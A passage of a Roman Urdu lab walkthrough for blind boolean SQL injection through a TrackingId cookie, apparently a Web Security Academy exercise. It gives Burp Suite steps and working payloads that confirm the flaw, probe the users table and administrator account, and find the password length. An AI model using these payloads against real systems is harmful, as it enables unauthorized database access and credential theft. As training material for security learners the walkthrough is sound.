## Step-by-step yeh hai:

**1. Burp Suite Pr Request Intercept Karein**
 * Web application ki front page pr jaen aur Burp Suite ko on kr ke page refresh karein taake **TrackingId** cookie wali request intercept ho jaye. Is request ko **Burp Repeater** mein bhej dein.

**2. Vulnerability Verify Karein (Boolean Check)**
 * Cookie ki value mein jahan original string ho (misal ke tor pr TrackingId=xyz), uske aagay SQL payload add kar ke check karein ke application true/false conditions pr kaisa response deti hai:
   * TrackingId=xyz' AND '1'='1 (Check karein ke response mein **"Welcome back"** message nazar aata hai ya nahi).
   * TrackingId=xyz' AND '1'='2 (Yahan "Welcome back" gayab ho jana chahiye, jisse pata chalta hai ke boolean condition kaam kar rahi hai).

**3. Database aur Administrator User Confirm Karein**
 * Yeh check karne ke liye ke users table mojood hai ya nahi, request yehi rakhein:
   * TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
 * Phir yeh confirm karne ke liye ke administrator user exist karta hai ya nahi:
   * TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

**4. Administrator Password ki Length Maloom Karein**
 * Password ki lambai check karne ke liye LENGTH() function use hota hai. Repeater mein aik aik kar ke check karein:
   * TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 * Is tarah >2, >3 barhate jaen jab tak "Welcome back" message aana band na ho jaye. Is lab mein administrator ka password **20 characters** lamba hota hai.

